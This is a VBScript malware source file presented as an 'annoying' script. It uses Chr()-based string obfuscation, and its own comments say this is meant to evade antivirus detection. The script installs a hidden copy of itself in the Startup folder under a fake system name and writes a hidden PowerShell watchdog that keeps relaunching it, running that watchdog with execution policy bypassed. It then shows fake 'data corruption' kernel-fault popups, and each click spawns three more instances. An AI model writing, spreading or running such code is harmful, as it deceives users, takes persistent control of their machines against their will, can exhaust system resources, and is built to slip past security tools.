' Obfuscated Annoying VBScript with PowerShell Monitor
' Attempts to evade basic AV detection via string manipulation and renaming.
' Functionality remains the same: Persistent, annoying popups with monitor.
' Warning: Still persistent and annoying. Use cautiously.

Option Explicit

Dim oSh, oFs, oArgs, sUp, vP, pP, qVp, iCnt, iRsp, oFa, psC, oTf, vNm, pNm, iChk, sTmp1, sTmp2, sTmp3

' --- Obfuscated Object Creation ---
sTmp1 = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) ' WScript
sTmp2 = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108) ' Shell
Set oSh = CreateObject(sTmp1 & Chr(46) & sTmp2) ' WScript.Shell

sTmp1 = Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(105) & Chr(110) & Chr(103) ' Scripting
sTmp2 = Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) ' FileSystem
sTmp3 = Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) ' Object
Set oFs = CreateObject(sTmp1 & Chr(46) & sTmp2 & sTmp3) ' Scripting.FileSystemObject

Set oArgs = WScript.Arguments

' --- Obfuscated Configuration ---
vNm = Chr(83) & "ystem" & Chr(67) & "ritical" & Chr(80) & "rocess" & Chr(46) & Chr(118) & Chr(98) & Chr(115) ' SystemCriticalProcess.vbs
pNm = Chr(83) & "ystem" & Chr(77) & "onitor" & Chr(72) & "ost" & Chr(46) & Chr(112) & Chr(115) & Chr(49) ' SystemMonitorHost.ps1
iChk = 10 + 0 ' CHECK_INTERVAL_SECONDS = 10 (using math to obscure)

' --- Obfuscated Persistence Setup ---
sTmp1 = Chr(83) & Chr(116) & Chr(97) & Chr(114) & Chr(116) & Chr(117) & Chr(112) ' Startup
sUp = oSh.SpecialFolders(sTmp1)

vP = oFs.BuildPath(sUp, vNm)
pP = oFs.BuildPath(sUp, pNm)
qVp = Chr(34) & vP & Chr(34) ' Quoted VBS path

' Check if running from Startup path (case-insensitive compare)
If LCase(WScript.ScriptFullName) <> LCase(vP) Then
    On Error Resume Next ' Ignore errors

    ' 1. Copy VBS to Startup
    oFs.CopyFile WScript.ScriptFullName, vP, True
    If oFs.FileExists(vP) Then
        Set oFa = oFs.GetFile(vP)
        If Not (oFa.Attributes And 2) Then oFa.Attributes = oFa.Attributes + 2 ' Hidden
    End If

    ' 2. Create Obfuscated PowerShell Monitor Script
    Dim psCmd_GetProc, psCmd_StartProc, psVar_VbsPath, psVar_ScriptName, psVar_Interval
    psVar_VbsPath = "$vP" & "ath = " & Chr(34) & vP & Chr(34)
    psVar_ScriptName = "$vN" & "ame = " & Chr(34) & vNm & Chr(34)
    psVar_Interval = "$cI" & "nt = " & iChk

    psCmd_GetProc = Chr(71) & "et-" & Chr(67) & "imInstance" ' Get-CimInstance
    psCmd_StartProc = Chr(83) & "tart-" & Chr(80) & "rocess" ' Start-Process

    psC = psVar_VbsPath & vbCrLf & _
          psVar_ScriptName & vbCrLf & _
          psVar_Interval & vbCrLf & _
          "while (" & Chr(36) & "true) {" & vbCrLf & _
          "    Start-Sleep -Seconds " & Chr(36) & "cInt" & vbCrLf & _
          "    $rP = " & psCmd_GetProc & " Win32_Process -Filter ""Name = 'wscript.exe' AND CommandLine LIKE '%"" + " & Chr(36) & "vName + ""%""""" & vbCrLf & _
          "    if (" & Chr(36) & "null -eq " & Chr(36) & "rP) {" & vbCrLf & _
          "        try {" & vbCrLf & _
          "            " & psCmd_StartProc & " wscript.exe -ArgumentList ""//B `"""" + " & Chr(36) & "vPath + ""``"""" -WindowStyle Hidden -ErrorAction Stop" & vbCrLf & _
          "        } catch {}" & vbCrLf & _
          "    }" & vbCrLf & _
          "}"

    Set oTf = oFs.CreateTextFile(pP, True)
    oTf.Write psC
    oTf.Close
    Set oTf = Nothing

    If oFs.FileExists(pP) Then
        Set oFa = oFs.GetFile(pP)
        If Not (oFa.Attributes And 2) Then oFa.Attributes = oFa.Attributes + 2 ' Hidden
    End If

    ' 3. Run VBS copy (hidden)
    sTmp1 = Chr(119) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' wscript.exe
    oSh.Run sTmp1 & " //B " & qVp, 0, False

    ' 4. Run PowerShell Monitor (hidden, bypass policy)
    sTmp1 = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' powershell.exe
    sTmp2 = " -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & pP & Chr(34)
    oSh.Run sTmp1 & sTmp2, 0, False

    On Error GoTo 0
    WScript.Quit
End If

' --- Obfuscated Annoyance Logic ---
If oArgs.Count > 0 And IsNumeric(oArgs(0)) Then
    iCnt = Abs(CInt(oArgs(0)))
Else
    iCnt = 1
End If

Randomize
WScript.Sleep(Int((500 * Rnd) + 100)) ' Delay kept for annoyance rhythm

' Obfuscated Beep
sTmp1 = Chr(114) & Chr(117) & Chr(110) & Chr(100) & Chr(108) & Chr(108) & Chr(51) & Chr(50) ' rundll32
sTmp2 = Chr(117) & Chr(115) & Chr(101) & Chr(114) & Chr(51) & Chr(50) & Chr(46) & Chr(100) & Chr(108) & Chr(108) ' user32.dll
sTmp3 = Chr(77) & Chr(101) & Chr(115) & Chr(115) & Chr(97) & Chr(103) & Chr(101) & Chr(66) & Chr(101) & Chr(101) & Chr(112) ' MessageBeep
oSh.Run sTmp1 & " " & sTmp2 & "," & sTmp3, 0, True

' Annoying message box (strings slightly changed)
iRsp = MsgBox("Error E" & iCnt & "! Data corruption detected." & vbCrLf & "Code: " & Rnd(), vbCritical + vbOKOnly, "!! KRNL_FAULT !!")

If iRsp = vbOK Then
    sTmp1 = Chr(119) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' wscript.exe
    oSh.Run sTmp1 & " //B " & qVp & " " & (iCnt + 1), 0, False
    oSh.Run sTmp1 & " //B " & qVp & " " & (iCnt + 2), 0, False
    oSh.Run sTmp1 & " //B " & qVp & " " & (iCnt + 3), 0, False
End If

' --- End of Obfuscated Script ---
